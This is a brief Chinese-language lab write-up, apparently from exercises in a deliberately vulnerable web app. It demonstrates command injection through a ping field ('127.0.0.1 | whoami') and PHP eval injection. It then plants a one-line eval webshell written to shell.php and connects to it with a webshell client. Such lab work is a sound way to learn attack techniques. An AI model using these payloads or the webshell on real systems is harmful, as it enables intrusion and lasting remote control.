### exec ping
![[Pasted image 20260625103714.png]]

	分析：测试简答的ping命令，IP地址为127.0.0.1或者其他的都可以

得出命令可以正常执行
![[Pasted image 20260625103803.png]]

**构建payload

```
127.0.0.1 | whoami
```

![[Pasted image 20260625104527.png]]

	分析：做到这里已经可以了，绕过了防护。

### exec evel
![[Pasted image 20260625104619.png]]

**构造payload
```
phpinfo();
```
![[Pasted image 20260625105728.png]]

	分析：发现这个没有任何限制，输入phpinfo();发现可以被执行，就可以写一个远程shell

```php
file_put_contents('shell.php', '<?php @eval($_POST["password"]); ?>');
```

尝试用webshell连接工具连接
![[Pasted image 20260625112838.png]]